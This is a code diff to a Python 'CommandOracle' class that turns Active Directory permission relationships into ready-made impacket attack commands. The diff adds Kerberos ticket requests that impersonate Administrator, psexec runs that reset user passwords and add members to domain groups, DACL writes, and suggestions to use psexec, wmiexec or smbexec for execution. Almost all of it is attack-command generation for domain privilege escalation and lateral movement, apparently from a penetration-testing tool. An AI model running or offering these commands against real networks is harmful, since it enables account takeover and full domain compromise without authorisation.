@@ -104,7 +104,13 @@ class CommandOracle:
 
         if normalized_edge == "GenericAll" and target.node_type == "computer":
             target_spn = target.spn or f"HOST/{target.name}"
-            return f"impacket-getST{auth_part} -spn {target_spn} {domain}/{username}"
+            target_host = target.name or "<TARGET_COMPUTER>"
+            return (
+                f"# Step 1: Get service ticket (requires GenericAll on computer) \n"
+                f"impacket-getST{auth_part} -spn {target_spn} {domain}/{username} "
+                f"-impersonate Administrator\n"
+                f"# Step 2: Use ticket for lateral movement (set KRB5CCNAME first)"
+            )
 
         if normalized_edge == "WriteDacl":
             target_object = target.name or target.id or "<TARGET_OBJECT>"
@@ -136,27 +142,31 @@ class CommandOracle:
                 target_user = target_user.split("@", maxsplit=1)[0]
             
             new_password = "<NEW_PASSWORD>"
+            target_host = "<TARGET_HOST>"
             return (
-                f"impacket-samrdump -newpass {new_password}{auth_part} {domain}/{username} "
-                f"{target_user}@{domain}"
+                f"impacket-psexec{auth_part} {domain}/{username}@{target_host} "
+                f"'net user {target_user} {new_password}'"
             )
 
         # CanAddMember / AddMember
         if normalized_edge in ("CanAddMember", "AddMember"):
             target_group = target.name or "<TARGET_GROUP>"
-            if "@" in target_group:
+            if "\\" in target_group:
+                target_group = target_group.split("\\", maxsplit=1)[1]
+            elif "@" in target_group:
                 target_group = target_group.split("@", maxsplit=1)[0]
             
             member_to_add = "<MEMBER_TO_ADD>"
+            target_host = "<TARGET_DOMAIN_CONTROLLER>"
             return (
-                f"impacket-getST{auth_part} {domain}/{username} "
-                f"-add-group-member {target_group} {member_to_add}"
+                f"impacket-psexec{auth_part} {domain}/{username}@{target_host} "
+                f"'net group \"{target_group}\" {member_to_add} /add /domain'"
             )
 
         # AllExtendedRights
         if normalized_edge == "AllExtendedRights":
             if target.node_type == "user":
-                # AllExtendedRights on user = ResetPassword
+                # AllExtendedRights on user = reset password via net user
                 target_user = target.name or "<TARGET_USER>"
                 if "\\" in target_user:
                     target_user = target_user.split("\\", maxsplit=1)[1]
@@ -164,24 +174,26 @@ class CommandOracle:
                     target_user = target_user.split("@", maxsplit=1)[0]
                 
                 new_password = "<NEW_PASSWORD>"
+                target_host = "<TARGET_HOST>"
                 return (
-                    f"impacket-samrdump -newpass {new_password}{auth_part} "
-                    f"{domain}/{username} {target_user}@{domain}"
+                    f"impacket-psexec{auth_part} {domain}/{username}@{target_host} "
+                    f"'net user {target_user} {new_password}'"
                 )
             else:
-                # AllExtendedRights on other objects
+                # AllExtendedRights on group/computer = full DACL control
                 target_object = target.name or target.id or "<TARGET_OBJECT>"
                 return (
                     f"impacket-dacledit{auth_part} -action write -rights AllExtendedRights "
-                    f"-target '{target_object}' {domain}/{username}"
+                    f"-principal '{username}' -target '{target_object}' {domain}/{username}"
                 )
 
-        # GenericWrite
+        # GenericWrite / CanGenericWrite
         if normalized_edge == "GenericWrite" or normalized_edge == "CanGenericWrite":
             target_object = target.name or target.id or "<TARGET_OBJECT>"
             return (
                 f"impacket-dacledit{auth_part} -action write -rights GenericWrite "
-                f"-target '{target_object}' {domain}/{username}"
+                f"-principal '{username}' -target '{target_object}' {domain}/{username}\n"
+                f"# GenericWrite may allow: password reset (user), spn modification (computer), etc."
             )
 
         # Owns
@@ -189,14 +201,16 @@ class CommandOracle:
             target_object = target.name or target.id or "<TARGET_OBJECT>"
             return (
                 f"impacket-owneredit{auth_part} -action write -target '{target_object}' "
-                f"{domain}/{username}"
+                f"{domain}/{username}\n"
+                f"# Owner has full control; consider next steps like DACL modification or password reset"
             )
 
         tool = EDGE_TOOL_MAP.get(normalized_edge, "manual")
         return (
-            f"# No direct automation for edge '{normalized_edge}'. Suggested tool: {tool}\n"
+            f"# Edge type '{normalized_edge}' requires manual enumeration or custom approach\n"
             f"# Source: {source.name} ({source.node_type}) -> Target: {target.name} ({target.node_type})\n"
-            f"# Use impacket-samrdump, impacket-getST, or similar tools based on the relationship type."
+            f"# Suggested tool to investigate: {tool}\n"
+            f"# Try using impacket-psexec, impacket-wmiexec, or impacket-smbexec for execution"
         )
 
     def get_kerberoast_command(self, target_node: dict[str, str]) -> str:
